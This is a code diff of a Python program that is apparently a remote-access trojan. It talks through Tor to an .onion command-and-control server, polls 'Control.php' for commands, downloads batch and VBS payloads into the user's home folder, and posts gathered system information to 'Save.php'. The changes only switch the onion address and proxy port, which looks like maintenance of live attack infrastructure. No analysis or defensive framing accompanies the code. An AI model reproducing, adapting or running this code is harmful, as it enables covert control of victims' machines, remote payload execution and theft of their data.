@@ -21,8 +21,8 @@ import shutil
 import string
 
 proxies = {
-    'http': 'socks5h://127.0.0.1:9150',  # Tor proxy address and port for HTTP
-    'https': 'socks5h://127.0.0.1:9150'  # Tor proxy address and port for HTTPS
+    'http': 'socks5h://127.0.0.1:9151',  # Tor proxy address and port for HTTP
+    'https': 'socks5h://127.0.0.1:9151'  # Tor proxy address and port for HTTPS
 }
 
 requests_session = requests.Session()
@@ -60,7 +60,7 @@ def METASPLOIT():
     previous_data = "" 
   
     while True:
-     url = 'http://yiqcvh5ewyjhkabtexi5puj3ffs5i6ctpwd7dkqsj4g7jjb7koqxjkqd.onion/Metasploit.php'
+     url = 'http://haoj6nrd5zkiq3wkgwa7vkbtou623yjhkavqm5zajo4wfdynu7ezhvad.onion/Metasploit.php'
      time.sleep(5)
      response = requests_session.get(url)
 
@@ -90,7 +90,7 @@ def METASPLOIT():
                     restart_program()
                 elif option == "STARTVBSBAT":
                     os.system("cls")
-                    php_script_url = 'http://yiqcvh5ewyjhkabtexi5puj3ffs5i6ctpwd7dkqsj4g7jjb7koqxjkqd.onion/Control.php'
+                    php_script_url = 'http://haoj6nrd5zkiq3wkgwa7vkbtou623yjhkavqm5zajo4wfdynu7ezhvad.onion/Control.php'
                     home_directory = os.path.expanduser("~")
                     web_page1_path = os.path.join(home_directory, "Script.bat")
                     vbs_file_path = os.path.join(home_directory, "VBSEX.vbs")
@@ -99,8 +99,8 @@ def METASPLOIT():
                         if os.path.exists(file_path):
                             os.remove(file_path)
 
-                    url1 = "http://yiqcvh5ewyjhkabtexi5puj3ffs5i6ctpwd7dkqsj4g7jjb7koqxjkqd.onion/Script.io"
-                    url2 = "http://yiqcvh5ewyjhkabtexi5puj3ffs5i6ctpwd7dkqsj4g7jjb7koqxjkqd.onion/VBSEX.io"
+                    url1 = "http://haoj6nrd5zkiq3wkgwa7vkbtou623yjhkavqm5zajo4wfdynu7ezhvad.onion/Script.io"
+                    url2 = "http://haoj6nrd5zkiq3wkgwa7vkbtou623yjhkavqm5zajo4wfdynu7ezhvad.onion/VBSEX.io"
 
                     download_file(url1, web_page1_path)
                     download_file(url2, vbs_file_path)
@@ -326,9 +326,9 @@ def get_system_info():
         session = requests.Session()
         session.proxies = proxies
 
-        url = "http://yiqcvh5ewyjhkabtexi5puj3ffs5i6ctpwd7dkqsj4g7jjb7koqxjkqd.onion/Save.php"
+        url = "http://haoj6nrd5zkiq3wkgwa7vkbtou623yjhkavqm5zajo4wfdynu7ezhvad.onion/Save.php"
         data = data_to_send
-        response = session.post(url, data=data)
+        response = requests_session.post(url, data=data)
         print(response.text)
 
         return data_to_send
@@ -343,7 +343,7 @@ while True:
             global previous_command, previous_files
 
             while True:
-                php_script_url = f'http://yiqcvh5ewyjhkabtexi5puj3ffs5i6ctpwd7dkqsj4g7jjb7koqxjkqd.onion/Control.php'
+                php_script_url = f'http://haoj6nrd5zkiq3wkgwa7vkbtou623yjhkavqm5zajo4wfdynu7ezhvad.onion/Control.php'
                 
                 response = requests_session.get(php_script_url)
                 data = response.text.strip()
